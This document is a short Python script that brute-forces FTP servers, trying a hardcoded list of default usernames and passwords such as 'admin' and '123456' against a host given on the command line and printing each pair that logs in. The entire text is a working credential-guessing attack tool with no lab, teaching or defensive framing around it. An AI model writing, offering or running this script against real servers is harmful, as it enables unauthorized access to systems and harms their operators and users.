import ftplib
import sys

def brute_force_ftp(host, user_list, pass_list):
    for username in user_list:
        for password in pass_list:
            try:
                ftp = ftplib.FTP(host)
                ftp.login(username, password)
                print(f"Success: {username}:{password}")
                ftp.quit()
            except Exception:
                pass

if __name__ == "__main__":
    host = sys.argv[1]
    user_list = ["admin", "user", "ftp"]
    pass_list = ["admin", "password", "123456"]
    brute_force_ftp(host, user_list, pass_list)
